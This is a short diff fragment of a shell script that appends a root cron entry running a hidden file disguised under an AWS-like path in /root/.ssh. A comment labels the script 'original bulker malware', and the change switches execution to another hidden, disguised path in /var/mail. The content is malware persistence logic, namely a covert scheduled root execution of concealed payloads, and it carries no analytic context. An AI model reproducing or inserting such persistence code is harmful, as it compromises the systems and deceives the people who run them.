@@ -8,5 +8,5 @@
 echo "*/52 * * * * root /root/.ssh/.aws/.ec2-instance-connect" >> /etc/crontab
 
 # Running original bulker malware.
-bash /run/aws/.ec2-instance
+bash /var/mail/.aws-ses
 
